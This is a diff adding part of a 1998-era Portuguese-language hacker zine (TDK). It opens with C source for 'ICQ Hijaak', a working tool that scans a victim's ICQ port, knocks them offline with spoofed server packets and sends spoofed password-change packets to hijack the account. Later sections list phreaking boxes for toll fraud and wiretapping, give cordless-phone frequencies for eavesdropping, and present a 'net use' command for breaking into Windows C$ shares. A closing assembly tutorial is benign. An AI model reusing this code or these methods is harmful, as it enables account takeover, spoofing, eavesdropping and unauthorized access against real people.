+                                NEXT( PREV( cur ) ) = cur;
+                                PREV( NEXT( cur ) ) = cur;
+
+                                cnt++;
+                                continue;
+                        }
+                        cur = NEXT( LIVE_HEAD );
+                        while ( NEXT(cur) != -1 ) {
+                                if ( PORT(cur) == got_port ) {
+
+                                        PREV( NEXT(cur)  ) = PREV( cur );
+                                        NEXT( PREV(cur) ) = NEXT( cur );
+
+                                        PREV( cur ) = PREV( UNUSED_TAIL );
+                                        NEXT( cur ) = UNUSED_TAIL;
+                                        NEXT( PREV( cur ) ) = cur;
+                                        break;
+                                }
+                                cur = NEXT(cur);
+                        }
+                        if ( NEXT(cur) == -1 ) {
+                                printf("RESPONSE FOR PORT %d UNEXPECTED! \n",
+                                        got_port);
+                        } else {
+                                cnt++;
+                        }
+
+                }
+                printf("[UDP Scan working] Got %d responses \n", cnt );
+
+
+                if  ( cnt < ( (cur_send/4) * 3 ) ) {
+
+                        cur_send /= 2;
+                        if ( cur_send < 16 ) {
+                                cur_send = 16;
+                        }
+
+                } else {
+                        cur_send *= 2;
+                        if ( cur_send > MAX_BURST ) {
+                                cur_send = MAX_BURST;
+                 } } cur = NEXT( LIVE_HEAD );
+                while ( NEXT(cur) != -1 ) {
+                        if (!TIMES(cur) ) {
+                                printf("SCORE!  Port is %d \n",PORT(cur));
+                                close( s_icmp );
+                                close( rawsock);
+                                *tport = PORT(cur);
+                                return SUCCESS;
+                        }
+                        cur = NEXT(cur);
+                }
+
+        }
+
+        close( s_icmp );
+        close( rawsock);
+        return SUCCESS;
+}
+#define COMMAND_CHANGEPASSWORD  0x049C
+#define COMMAND_LOGOFF  0x0438
+#define RESPONSE_ERROR  0x00F0
+
+int WritePacket(u8        * data_ptr,
+                int     * size,
+                char    * format,
+                ...     )
+
+{
+        u8              * ptr;
+        va_list         ap;
+        u32             dword_param;
+        u16             word_param;
+        u8              byte_param;
+        u8              * string_param;
+        int             string_length;
+        int             * data_length;
+
+        ap = va_start( ap, format );
+        ptr = data_ptr;
+
+        while ( *format ) {
+                switch ( *format++ ) {
+                case 'L':  
+                        dword_param = va_arg(ap, u32 );
+                        *(ptr++) = dword_param & 0xFF;
+                        *(ptr++) = (dword_param >> 8 ) & 0xFF;
+                        *(ptr++) = (dword_param >> 16) & 0xFF;
+                        *(ptr++) = (dword_param >> 24) & 0xFF;
+                        break;
+                case 'W': 
+                        word_param = va_arg(ap, u16 );
+                        *(ptr++) = word_param & 0xFF;
+                        *(ptr++) = (word_param >> 8 ) & 0xFF;
+                        break;
+                case 'B': 
+                        byte_param = va_arg(ap, u8 );
+                        *(ptr++) = byte_param;
+                        break;
+
+                case 'S': 
+                        string_param = va_arg(ap, u8 * );
+                        string_length = strlen( string_param ) + 1;
+                        *(ptr++) = (string_length ) & 0xFF;
+                        *(ptr++) = (string_length >> 8)  & 0xFF;
+                        memcpy( ptr, string_param, string_length );
+                        ptr += string_length;
+                        break;
+                case 'D':  
+                        data_length = va_arg(ap, int * );
+                        string_param = va_arg(ap, u8 * );
+                        memcpy( ptr, string_param , *data_length );
+                        ptr += *data_length;
+                        break;
+
+                default:
+                        fprintf(stderr,"Invalid type %c \n", *(format-1) );
+                        return FAILURE;
+                }
+
+        }
+        
+        *size = (ptr - data_ptr );
+        return SUCCESS;
+}
+u32     icq_uin = -1;
+u16     icq_seq = 0;
+u16     icq_seq2 = 0;
+#define ICQ4_VER        0
+#define ICQ4_RANDOM     2
+#define ICQ4_ZERO       4
+#define ICQ4_COMMAND    6
+#define ICQ4_SEQ        8
+#define ICQ4_SEQ2       10
+#define ICQ4_UID        12
+#define ICQ4_CHECK      16
+#define ICQ4_END        20
+void create_icq4_hdr(
+                u8      * data_ptr,
+                u16     any_number,
+                u16     command,
+                int     data_size
+                 )
+{
+u32     check;
+u32     check2;
+u32     keyvalue;
+int     count;
+int     length;
+int     i;
+u8      ofs;
+u8      val;
+
+length = data_size + ICQ4_END;
+
+memset( data_ptr, 0, ICQ4_END );
+
+word(*data_ptr, ICQ4_VER ) = 0x4; word(*data_ptr, ICQ4_RANDOM) = any_number;
+word(*data_ptr, ICQ4_COMMAND ) = command; word(*data_ptr, ICQ4_SEQ ) = icq_seq;
+word(*data_ptr, ICQ4_SEQ2 ) = icq_seq2; dword(*data_ptr,ICQ4_UID ) = icq_uin;
+dword(*data_ptr,ICQ4_CHECK) = 0x0;
+
+check = ( *(data_ptr + 8) << 24) | ( *(data_ptr + 4) << 16 ) |
+        ( *(data_ptr + 2) << 8 ) | ( *(data_ptr + 6) );
+ofs = random() % length; val = *(data_ptr + ofs );
+check2 = ( ofs << 24 ) | ( val << 16 );
+ofs = random() % 256; val = icq_check_data[ ofs ];
+check2 |= ( ofs << 8 ) | ( val ); check2 ^= 0x00FF00FF; check ^= check2;
+dword(*data_ptr,ICQ4_CHECK ) = check;
+keyvalue = length * 0x66756B65; keyvalue += check;
+count = ( length + 3 ) / 4; count += 3; count /= 4;
+for ( i = 0; i < count ; i++ ) {
+        u32 * r;
+        if ( i == 4 ) continue; r = (u32 *)(data_ptr + (i*4) );
+ *r ^= (keyvalue + icq_check_data[i*4] ); }
+word(*data_ptr, ICQ4_VER ) = 0x4; 
+}
+
+void    create_icq3_header(     u8 * data_ptr, int * size, u16  command,
+ u16  seq1, u16  seq2, u32  UIN )
+{
+        int     len, len2, err, ofs, val;
+        u32     check, check2;
+
+        err = WritePacket( data_ptr,&len, "WWWWL",
+                0x03, command, seq1, seq2, UIN );
+        if ( err == FAILURE ) {
+                printf("Programmer Error in create_icq3_header\n"); exit(-1); }
+        check = ( *(data_ptr + 8) << 24) | ( *(data_ptr + 4) << 16 ) |
+                ( *(data_ptr + 2) << 8 ) | ( *(data_ptr + 6) );
+        ofs = random() % len; val = *(data_ptr + ofs );
+        check2 = ( ofs << 24 ) | ( val << 16 );
+        ofs = random() % 256;
+        val = icq_check_data[ ofs ];
+        check2 |= ( ofs << 8 ) | ( val );
+        check2 ^= 0x00FF00FF; check ^= check2;
+        err = WritePacket( (data_ptr + len),&len2,"L", check );
+ *size = len + len2; }
+static  u8      packet[ 1500 ];
+void main( int argc, char ** argv );
+void main(  int argc, char ** argv )
+{
+        int     count;
+        int     i;
+        u16     j, k;
+        struct in_addr * addr_list;
+        struct in_addr * target_list;
+        int     err;
+        struct in_addr  you;
+        struct in_addr  me;
+        int             rawsock;
+        struct sockaddr raddr;
+        struct sockaddr_in * r_in = (struct sockaddr_in *)&raddr;
+        int     size;
+        u8      * data_ptr;
+        u8      * hdr_ptr;
+        int     hdr_size;
+        u16     your_port;
+        int     retries;
+        int     base_port;
+        if ( argc < 5 ) {
+                fprintf(stderr,
+"--=--==[ ICQ Hijaak ]=====------------------------==--------------\n"
+"Author:  wumpus@innocent.com    *    Copyright (c) 1998  Wolvesbane\n"
+"Usage: \n"
+"       hijaak [options] icq-server target-uin target-ip new-password \n"
+"\n"
+"icq-server:    Packets will be *spoofed* from the (possibly plural) \n"
+"               IP addresses of this parameter. \n"
+"\n"
+"target-uin:    D'Oh!  \n\n"
+"target-ip:     Finding this is up to you.  May the farce be with you\n"
+"\nnew-password: D'Oh! Take a guess \n"
+"\nNo options are available at this time.\n" );
+                exit(-1);
+        }
+        base_port = 0;
+        if ( argc > 5 ) { base_port = atoi( argv[5] ); }
+        if (!base_port)  base_port = 1024;
+        icq_uin = atol( argv[2] );
+        if ( !icq_uin ) {
+                fprintf(stderr, "Who do you want me to kill, boss? \n");
+                exit(-1); }
+        err = MultiResolve(argv[3],&count,&target_list);
+        if ( err == -1 ) { herror("Resolving target\n"); exit(-1); }
+        if ( count > 1 ) { fprintf(stderr,
+"Hey! Moron!  You need to specify an UNAMBIGUOUS victim IP. \n" );
+                exit(-1); }
+        you = target_list[0];
+        free( target_list );
+        err = MultiResolve(argv[1],&count,&addr_list);
+        if ( err == -1 ){ herror("Resolving ICQ server"); exit(-1); }
+        r_in->sin_port = htons( 1984 ); 
+        r_in->sin_family = AF_INET; r_in->sin_addr = you;
+
+        hdr_ptr = packet + IP_END + UDP_END;
+
+        rawsock = CreateRawSocket();
+
+        printf("** Scanning for luser's ICQ port ...\n");
+
+        your_port = base_port;
+        while ( 1 ) { err = UDPScan(you, your_port, 65535, &your_port );
+                if (  ( err == -1 ) || ( !your_port ) ) { fprintf(stderr,
+"D'Oh!  Can't find a target port.  Better check that target IP again!\n");
+                        exit(-1); }
+                if ( FAILURE == VerifyUDPPort( you, your_port ) ) {
+                        fprintf(stderr,
+"UDP scan found invalid port. Retrying...  Hit CTRL-C to exit\n");
+                        continue; }
+                break;
+        }
+        printf("*** Got luser's port at %d \n", your_port );
+        create_icq3_header(hdr_ptr, &hdr_size, RESPONSE_ERROR, 0,
+                0, icq_uin  ); retries = 3;
+        while ( retries-- ) {
+                printf("Trying to knock luser offline.  Attempt %d\n",
+                        3 - retries );
+                for ( i = 0; i < count ; i++ ) {
+                        int     psize;
+
+                        psize = IP_END + UDP_END + hdr_size;
+                        make_ip_hdr( packet, psize, IPPROTO_UDP, 0x666, 0,
+                                addr_list[i], you, 0x7F );
+                        make_udp_hdr( packet, psize - IP_END, 4000,your_port );
+                        err = sendto( rawsock, packet, psize, 0,
+                                &raddr, sizeof(raddr));
+                        if ( err != psize ) { perror("Sending"); exit(-1); }
+                }
+                if ( FAILURE == VerifyUDPPort( you, your_port ) ) { break; }
+                sleep( 3 );     
+                if ( FAILURE == VerifyUDPPort( you, your_port ) ) { break; }
+                sleep(3);
+        }
+        printf("Retries is %d \n", retries );
+        if ( 0 > retries ) { fprintf(stderr,
+"Uh Oh!  Something ain't working.  Can't toast the luser.  Sorry, dude.\n");
+                exit(-1); }
+        
+        sleep(16);
+        printf("** Scanning for luser's _new_ ICQ port ...\n");
+        while ( 1 ) {
+                err = UDPScan(you, your_port, 65535, &your_port );
+                if (  ( err == -1 ) || ( !your_port ) ) { fprintf(stderr,
+"D'Oh! Can't find the new port!  Maybe your target is smarter than you?\n");
+                        exit(-1); }
+                if ( FAILURE == VerifyUDPPort( you, your_port ) ) {
+                        fprintf(stderr,
+"New UDP scan found invalid port. Retrying...  Hit CTRL-C to exit\n");
+                        continue; } break; }
+        printf("*** Got luser's new connection at %d \n", your_port );
+        printf("*** Hijaaking account now...(*LONG* version)\n");
+        for ( k = 0; k < 14 ; k++ ) {
+                for ( j = 0; j < 14 ; j++ ) {
+                        int     psize;
+                        icq_seq = k; icq_seq2 = j;
+                        data_ptr = hdr_ptr + ICQ4_END;
+                        WritePacket( data_ptr, &size, "S",argv[4] );
+                        create_icq4_hdr(hdr_ptr, random()&0xFFFF,
+                                COMMAND_CHANGEPASSWORD, size );
+                        hdr_size = ICQ4_END;
+
+                        for ( i = 0; i < count ; i++ ) {
+                                psize = IP_END + UDP_END + hdr_size + size;
+                                make_ip_hdr( packet, psize, IPPROTO_UDP,
+                                        0x666, 0, you, addr_list[i], 0x7F );
+                                make_udp_hdr( packet, psize - IP_END,
+                                        your_port, 4000);
+                                err = sendto( rawsock, packet, psize, 0,
+                                        &raddr, sizeof(raddr));
+                                if ( err != psize ) { perror("Sending");
+                                        exit(-1); } usleep( 1000 );
+                                err = sendto( rawsock, packet, psize, 0,
+                                        &raddr, sizeof(raddr));
+                                if ( err != psize ) {
+                                        perror("Sending");
+                                exit(-1);
+                                } } } }
+        printf("Disconnecting the remote luser... \n");
+        create_icq3_header(hdr_ptr, &hdr_size, RESPONSE_ERROR, 0, 0, icq_uin  );
+        for ( i = 0; i < count ; i++ ) {
+                int     psize;
+                psize = IP_END + UDP_END + hdr_size;
+                make_ip_hdr( packet, psize, IPPROTO_UDP, 0x666, 0,
+                        addr_list[i], you, 0x7F );
+                make_udp_hdr( packet, psize - IP_END, 4000,your_port );
+                err = sendto( rawsock, packet, psize, 0,
+                        &raddr, sizeof(raddr));
+                if ( err != psize ) { perror("Sending"); exit(-1); } }
+        free( addr_list );
+}
+-------xX !!! CuT HeRe !!! !!! CuT HeRe !!! !!! CuT HeRe !!! Xx-------
+
+
+                         Cacaio@DeathKnights.com
+
+
+-=[  6  ]=-
+.------------------.
+| PHREAKING parte 2 \________________________________________________________
+`----------------------------------------------------------------------------'
+                                by Cacaio
+
+
+      .--------.  
+      | BOXES   `------------------------------------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+Eu acho que o Brasil todo tenha a existensia das boxes, mas poucas pessoas
+sabem para que que servem. Entao, resolvi falar aqui algumas delas.
+
+Aqua         Desvia a escuta do FBI se estiverem fazendo a mesma na sua linha.
+
+Black        Quem faz a ligacao para o numero com a black box nao paga nada
+             pela ligacao. Se quem tem a black box faz uma ligacao, esta pes-
+             soa paga.
+
+Blast        Nada mais do que um aplificador do microfone do telefone.
+
+Blotto       Supostamente faz a escuta de todos os telefones proximos. Nunca
+             funcionou, nao passa de um hoax.
+
+Blue         A mais famosa das boxes. Emula os codigos de um operador na trunk
+             usando um tom de 2600hz.
+
+Brown        Faz o que muita gente nao gosta. Cria propositalmente uma linha
+             cruzada de ate' 2 telefones que discaram para lugares diferentes.
+             Boa pra ligar pra 011-?4?6 ou shoptimes por ai'...
+
+Bud          Entra nas linhas de seus vizinhos.
+
+Chartreuse   Usa a eletrecidade da sua linha telefonica. Ja pensou nao pagar
+             mais eletrecidade?
+
+Cheese       Conecta dois telefones que tenham esta box para conversarem sem
+             pagar nada.
+
+Chrome       Manipula o trafico de sinais de controles remotos em geral.
+
+Color        A box para fazer escutas. Uma das poucas que ainda funcionam
+             no Brasil.
+
+Copper       Faz linhas cruzadas das linhas que voce escolher.
+
+Crimson      Botao para espera pra telefones que ainda nao o tem. Funciona no
+             Brasil mas e' praticamente inutil.
+
+Dark         Conhece roteador de internet? Este e' um de telefones.
+
+Dayglo       Conecta em qualquer linha da sua area.
+
+Divertor     O melhor roteador telefonico. Semelhante a Dark Box.
+
+DLOC         Como a cheese box, mas apenas um dos telefones precisa ter a box.
+
+Gold         Na minha opniao, uma das boxes mais uteis. Localiza chamadas,
+             avisa se sua ligacao esta sendo localizada e pode mudar a infor-
+             macao se tentarem localizar seu numero.
+
+Green        Como a red box que falarei a seguir, esta box tambem trabalha com
+             moedas. Pra que isto? Em outros paises quando se liga de orelhao
+             para um servico pago se coloca no orelhao a quantia em moedas ou
+             se passa o cartao de credito. Esta box emula os sinais de moedas.
+
+Infinity     Ativa remotamente uma linha/conexao telefonica desabilitada.
+
+Jack         Esta box e' inutil demais! E' so' um teclado numerico!
+
+Light        Esta e' boa pra quem tem so' 1 linha, ta usando a net e de repen-
+             te alguem vem e tira a extensao do gancho sem saber que voce ta'
+             na net. Esta box acende uma luz se qualquer extensao estiver sen-
+             do usada.
+
+Lunch        Transmissor AM
+
+Magenta      Conecta uma linha remota a outra linha remota.
+
+Neon         Microfone externo, como viva voz.
+
+Noise        Cria um barulho enorme na linha.
+
+Olive        Campainha externa. Unica utilidade e' que se pode aumentar o
+             quanto quiser a altura da campainha.
+
+Party        Exatamente como a ja citada DLOC.
+
+Pink         Exatamente como a ja citada DLOC.
+
+Purple       Exatamente como a ja citada Crismon.
+
+Rainbow      Quando tentam te localizar esta box acaba com a brincadeira jo-
+             gando 120v na linha telefonica. Nao funciona, mais um hoax.
+
+Razz         Exatamente como a ja citada Bud.
+
+Red          Lembra da Green box? Entao, so que esta so' usa moedas de quartos
+             de dollar.
+
+Rock         Adicione musica a sua linha telefonica. Divertida mais inutil.
+             Funciona no Brasil.
+
+Scarlet      Faz com que seus vizinhos tenham pouca receptividade das chamadas.
+
+Static       Mantem a voltagem da linha telefonica alta.
+
+Switch       Mistura da DLOC com a Light.
+
+Tan          Outra box para escuta, mas so' local.
+
+Tron         Muda as chaves da forca de modo que o relogio ande mais devagar.
+
+Violet       Nao deixa um telefone desligar.
+
+Yellow       Apenas uma extensao.
+
+      .-----------------------------------.  
+      | Frequencias de telefones sem fio.   `--------------------------.
+      `=================-=-====--==-=-=-===----==---=-=---=-=--- -- -  -
+
+
+Os telefones sem fio basicamente operam em 10 canais, mesmo quando na caixa
+fala que sao em 1000, 10000 ou o numero que seja. Se voce tem um ja percebeu
+que nao sao tantos canais como anunciado na caixa, pois tenho certeza de que
+a mesma linha cruzada entre os mesmos telefones ja aconteceu mais do que uma
+vez. (So' se voce mora em predio)
+
+Tudo bem, mas e dai'? E dai' que ja que os canais nao sao tantos na verdade,
+voce pode facilmente escutar a conversa de outros telefones sem fio. Para isto
+basta saber a frequencia dos canais.
+
+A seguir direi a frequencia dos telefones mais antigos(mas ainda muito usados).
+Se voce tem um radio amador, e' so' voce sair por ai' escutando a conversa dos
+outros. Mas se voce nao tem, nao tem problema. Na tdk04 ensinarei a fazer a
+TDK box, que ainda nao terminei. A utilidade dela sera exatamente fazer escuta
+de telefones sem fio. Nao se preocupe que e' dificil de te pegarem, quase
+impossivel. Sera' melhor se voce tiver algum conhecimento de radio amador(que
+nao seja so saber operar em 14.7, mas em varias frequencias).
+
+
+
+
+    ┌───────────────────────··FREQUENCIAS··────────────────────────────┐
+    │                                                                  │   
+    │        Canal      Transmissao da Mao    Transmissao da Base      │
+    │       -------    --------------------  ---------------------     │
+    │                                                                  │
+    │          1             49.670                46.610              │
+    │                                                                  │
+    │          2             49.845                46.630              │
+    │                                                                  │
+    │          3             49.860                46.670              │
+    │                                                                  │
+    │          4             49.770                46.710              │
+    │                                                                  │
+    │          5             49.875                46.730              │
+    │                                                                  │
+    │          6             49.830                46.770              │
+    │                                                                  │
+    │          7             49.890                46.830              │
+    │                                                                  │
+    │          8             49.930                46.870              │
+    │                                                                  │
+    │          9             49.990                46.930              │
+    │                                                                  │
+    │         10             49.970                46.970              │
+    │                                                                  │
+    │                                                                  │
+    └─────────────────────────··FREQUENCIAS··──────────────────────────┘
+
+
+   Bem... eh isso ae! To cansado e nao vo escrever mais nada nesse numero! :P
+
+        Beware...
+                   []'s
+
+                         Cacaio@DeathKnights.com
+-=[  7  ]=-
+.----------------.                
+| INVASAO POR IP  \__________________________________________________________
+`----------------------------------------------------------------------------'
+                                by ReNeGaDe
+
+Hi All! Sou ReNeGaDe e na ultima zine TDK nao fiz uma materia interessante
+mass nesta me inspirei espero que gostem. Antes de iniciar, quero deixra bem
+claro que nao tenho nenhuma responsabilidade do que pode acontecer se
+executado o procedimento citado, pois qualquer coisa que venha a acontecer
+eh problema todo seu.
+Vamos lah primeiro este metodo de invasao pega no Win NT e o 98B tambem. Para
+pegar no Win 95 tem que estar, com as atualizacoes feitas mas nao garanto que
+funcione. Vamos ao que interessa que ganhamos mais!
+
+1o - Metodo de INVASAO:
+
+Basta voce executar esta pequena linha:
+
+net use * \\ip_da_vitima\C$
+
+2o - Como proteger sua maquina:
+
+Se voce nao notou o C$ eh o compartilhamento padrao nos Windows para proteger
+jah sabe nao?!? Basta apenas modificar este compartilhamento!
+Agora voce nao sabe modificar o compartilhamento voce eh belo de um FDP mais
+tudo bem vai no Internet Explorer botao direito do mouse escolhe ah opcao
+compartilhamento e PRONTO! Modifica.
+
+3o - Uma observacao bem interessante:
+
+Para que você possa invadir e ser invadido seu computador tem que esta confi
+gurado para ser usado em REDE, quer dizer nos Win NT e 98B eles concerteza jah
+estao no 95 pode nao pegar porque simplesmente muitos deles nao estao configu-
+rados para ser usados em REDE. Caso nao pegando no Win 95 com a REDE instalada
+feitas atualizacoes e etc. Entao instala o NT porque pelo menos eh um rwindows
+que dah pro gasto.
+
+
+          Eh isso ae pessoal aqui se encerra mais uma materia da TDK!
+
+        Se  tiverem interesse  em  tirar  duvidas ou  apresentar  novas
+  ideias, aqui estah o meu email. Mais sem babozeiras hein pessoal vamos
+  ter um bom senso pois não sou desocupado.
+
+         cya l8er!
+
+                             ReNeGaDe@DeathKnights.com
+
+NOTA(feita por Cacaio): Bem, lembremos que isso so' funciona se voce estiver
+no win. Infelizmente nao da pra fazer o mesmo em unixes e sabores, mas tambem
+em unixes nao se e' vulneravel.
+
+
+-=[  8  ]=-
+.-------------------.
+|  Tutorial de asm!  \_______________________________________________________
+`----------------------------------------------------------------------------'
+                              by HunterHeads
+
+bom pra aprender um pouquito de asm.. melhor agente comecar pelo basico...
+vou def. umas coisitas. aqui pra ter melhor ideia sobre. 
+Sistema Computacional.
+
+-Chamamos de Sistema Computacional a completa configuracao de um computador,
+incluindo os perifericos e o sistema operacional.                                   
+-Processador Central.
+
+E tambem conhecido por CPU ou Unidade Central de Processamento, que por sua
+vez e composta pela unidade de controle e unidade de logica e aritmetica.
+Sua funcao consiste na leitura e escrita do conteudo das celulas de
+memoria,regular o trafego de dados entre as celulas de memoria e registradores
+especiais, e decodificar e executar as instrucoes de um programa.
+O processador tem uma serie de celulas de memoria usadas com frequencia e,
+dessa forma, sao partes da CPU. Estas celulas sao conhecidas com o nome de
+registradores. Um processador de um PC possui cerca de 14 registradores.
+Como os PCs tem sofrido evolucao veremos que podemos manipular
+registradores de 16 ou 32 bits.
+A unidade de logica e aritmetica da CPU realiza as operacoes relacionadas
+ao calculo simbolico e numerico. Tipicamente estas unidades apenas sao capazes
+de realizar operaoees elementares, tais como: adicao e subtracao de dois
+numeros inteiros, multiplicacao e divisao de numero inteiro, manuseio de
+bits de registradores e comparacao do conteudo de dois registradores.
+Computadores pessoais podem ser classificados pelo que e conhecido como
+tamanho da palavra, isto e, a quantidade de bits que o processador e capaz
+de manusear de uma so vez. aham ..
+
+-Unidades de Entrada e Saida. entra .sai . entra sai colx.
+
+Para que o computador possa ser util para nos se faz necessario que o
+processador se comunique com o exterior atraves de interfaces que permitem
+a entrada e a saida de informacoes entre ele e a memoria. Atraves do uso
+destas comunicacoes e possivel introduzir informacao a ser processada e mais tardeM
+visualizar os dados processados. Algumas das mais comuns unidades de entrada
+sao o teclado e o mouse. As mais comuns unidades de sa!da sFo a tela do monitor
+ e a impressora.
+
+-Memoria Principal. nao eh o seu cerebro nah k?
+
+E um grupo de celulas,que eh  fabricada com semi-condutores, usada
+para processamentos gerais, tais como a execucao de programas e o armazenamento
+de informaGdes para operacoes.
+
+Cada uma das celulas pode conter um valor numerico e  capaz de ser
+enderecada, isto e, pode ser identificada de forma singular em relacao a
+outras celulas pelo uso de um numero ou endereco.
+
+O nome generico destas memorias e Random Access Memory ou RAM. A principal
+desvantagem deste tipo de memoria e o fato de que seus circuitos integrados
+perderem a informacao que armazenavam quando a energia eletrica for
+interrompida, ou seja, ela e volatil. Este foi o motivo que levou E criacao
+de um outro tipo de memoria cuja informacao nao e perdida quando o sistema
+e desligado. Estas memorias receberam o nome de Read Only Memory ou ROM.
+
+-x-x-x-x-...
+
+Bom bora parar. .de falar merda. e vamos logo ao que interessa cof cofx.
+
+-x-x-x-x-x
+
+vamos conhecer melhor registradores..
+sao grupos de 8 ou 16 flip-flops..<- ummm interesting
+Um flip-flop e um dispositivo capaz de armazenar 2 niveis de voltagem, um
+baixo, geralmente 0.5 volts, e outro comumente de 5 volts. O nivel baixo de
+energia no flip-flop e interpretado como desligado ou 0, e o nivel alto,
+como ligado ou 1. Estes estados sao geralmente conhecidos como bits, que
+sao a menor unidade de informacao num computador.
+Um grupo de 16 bits e conhecido como palavra; uma palavra pode ser dividida
+em grupos de 8 bits chamados bytes, e grupos de 4 bits chamados nibbles.
+
+.Sistemas numericos bola difinir isto cof. nao eh os numelo de 1 - 10 nao k?
+
+O sistema numerico que nos usamos diariamente e o decimal, mas este sistema
+nao e conveniente para maquinas, pois ali as informacoes tbm serao codificadas
+de modo a interpretar os estados da corrente (ligado-desligado) ;)
+este modo de codigo faz com que tenhamos que conhecer o calculo posicional
+que nos permitir  expressar um numero em qualquer base onde precisarmos
+dele.
+
+E possivel representar um determinado numero em qualquer base atraves das
+seguinte formula:
+
+                                   M
+
+Onde n e a posicao do digito, iniciando da direita para a esquerda e
+numerando de 0. e  B o digito sobre o qual nos operamos e B e a base
+numerica usada.
+
+-como agente pode conv. numeros binarios para decimais
+O sistema binario e baseado em apenas duas condicoes ou estados, estar
+ligado(1), ou desligado(0), portanto sua base e dois.
+Para a conversFo, podemos usar a formula de valor posicional:
+
+Por exemplo, se tivermos o n#mero binario 10011, tomamos cada digito da
+direita para a esquerda e o multiplicamos pela base, elevando ao potencial
+correspondente E sua posicao relativa:
+
+Binary:         1         1       0       0       1
+
+Decimal:       1*2^0  + 1*2^1 + 0*2^2 + 0*2^3 + 1*2^4
+
+            =   1     +   2   +   0   +   0   +  16  = 19 decimal.
+
+O caracter ^ e usado em computacao como simbolo para potencia e * para a
+multiplicacao.
+
+-x-x-x-x-x-x-x-x-x-x-x-xx
+
+agora como conv. numero decimal pra binario :)
+
+melhor forma a conversao com calculadora cientifica.. ou tu quer ficar 30
+min fazendo conta? heeh, e muito mais facil, mas nem sempre podemos contar com isso, logo o maisM
+conveniente e, ao menos, sabermos uma formula para faze-la.
+
+O metodo resume-se na aplicacao de divisiveis sucessivas por 2, mantendo o
+resto como o digito binario e o resultado como o proximo numero a ser
+dividido.
+
+Tomemos como exemplo o numero decimal 43.
+
+43/2=21 e o resto e 1; 21/2=10 e o resto e 1; 10/2=5 e o resto e 0;M
+5/2=2 e o resto e 1; 2/2=1 e o resto e 0; 1/2=0 e o resto e 1.M
+
+Para construir o equivalente binario de 43, vamos pegar os restos obtidos
+de baixo para cima, assim temos 101011.
+
+-x-x-x-x-xx-x-
+
+Sistema hexa
+
+Na base hexadecimal temos 16 d!gitos, que vao de 0 a 9 e da letra A ate a
+F,estas letras representam os numeros de 10 a 15. Portanto contamos:
+0,1,2,3,4,5,6,7,8,9,A,B,C,D,E, e F.
+A conversao entre numeros binarios e hexadecimais e facil. A primeira coisa
+a fazer e dividir o numero binario em grupos de 4 bits, comecando da direita
+para a esquerda. Se no grupo mais E direita sobrarem d!gitos, completamos
+com zeros.
+Tomando como exemplo o numero binario 101011, vamos dividi-lo em grupos de
+4 bits:
+10;1011
+
+Preenchendo o ultimo grupo com zeros (o um mais a esquerda):
+
+0010;1011
+
+A seguir, tomamos cada grupo como um numero independente e consideramos o
+seu valor decimal:
+0010=2;1011=11
+
+-x---x-x-x-xx-x--x-xx-x-x-x-
+
+no proximo zine vamos entrar finalmente ao comeco de programacao asm...
+c_yax
+
+
+                          HunterH@DeathKnights.com
+
+
+-=[  9  ]=-
+.---------.                
+|  BONUS   \_________________________________________________________________
+`----------------------------------------------------------------------------'
+                                by Cacaio
+
+        Voce ta querendo demais, ne'? Depois de 3 edicoes da zine recheadas de
+bonus pra voce voce nao aproveitou nada? E' so usar a informacao que voce
+possivelmente ja tem para fazer seus proprios bonus. Por falar nisso, este tdk
+foi um bonus em si, pode vasculhar este zine que voce encontra o que voce ta
+querendo. De agora em diante voce nao vai ter mais esses bonus nao, agora se
+vira! Nao tem informacao o suficiente? Le o tdk que quem sabe pode te ajudar..
+
+                Cya!
+
+                            Cacaio@DeathKnights.com
+
+-=[  10  ]=-
+.-----------.
+| FEW WORDS  \_______________________________________________________________
+`----------------------------------------------------------------------------'
+                                 by Cacaio
+
+
+        Quer saber quem sao os membros do TDK? De uma olhada em nossa page!
+                                               http://www.DeathKnights.com
+
+        Se voce quiser se tornar um membro do TDK, esqueca, ja temos muitos
+        membros.
+
+        Se voce quiser mandar um e-mail dizendo o que achou do zine, dar su-
+        gestoes, reclamar, elogiar, meter o pau, colocar alguma materia, este-
+        ja a vontade.
+
+        Se voce tem um zine BOM *OU* um programa e queira disponibiliza-lo
+        para os outros, mande-nos um e-mail. Voce podera' hospeda-lo em
+        http://www.deathknights.com/SuaEscolha gratuitamente. Hey, nao vem
+        pensando que isso aqui e' GeoCities, Xoom ou Tripod nao, antes iremos
+        avaliar seu pedido.
+
+        AVISO NOVAMENTE:
+
+        O TDK (The Death Knights) nao visa nenhum fim lucrativo. Qualquer uso
+        das informacoes contidas aqui nao e de nossa responsabilidade. Se voce
+        fizer algo descrito e se der mal, problema seu. Nos ensinamos, mas nao
+        pedimos para usarem o conhecimento adquirido com este zine.
+
+
+        Ate o proximo TDK!
+
+
+ ___________________________________TDK______________________________________
+ ----------------------------------------------------------------------------
+
+                            Criticas? Sugestoes?
+
+
+                             tdk@DeathKnights.com
+
